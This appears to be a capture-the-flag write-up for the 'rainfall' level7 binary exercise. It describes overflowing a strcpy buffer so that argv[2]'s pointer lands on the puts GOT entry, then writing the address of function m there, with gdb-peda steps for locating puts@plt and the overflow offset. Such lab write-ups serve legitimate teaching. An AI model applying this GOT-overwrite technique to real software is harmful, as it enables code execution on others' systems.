...
Printf the time and a global variable "0x8049960"

fgets put the result of the fopen on a global string "0x8049960", the same of the printf

We need to read this global variable by calling the function m

We can overwrite the puts call by "m" in the GOT table using the strcpy overflow

*********************************

Get the address of puts in the GOT table

gdb-peda$ info function puts
All functions matching regular expression "puts":

	Non-debugging symbols:
	0x08048400  puts@plt
	(gdb-peda)$ x/i 0x08048400
...
Get the offset of the first strcpy overflow

	(gdb-peda)$ pattern create 50 file

	gdb-peda$ r $(cat file)
	Starting program: /home/nico/42/rainfall/level7/Ressources/level7 $(cat file)
...
argv[1] = 20, if we inject more, we overwrite argv[2], with the puts GOT address in this case

Finaly, in the second argument, we just pass the address of "m" for replace the puts call
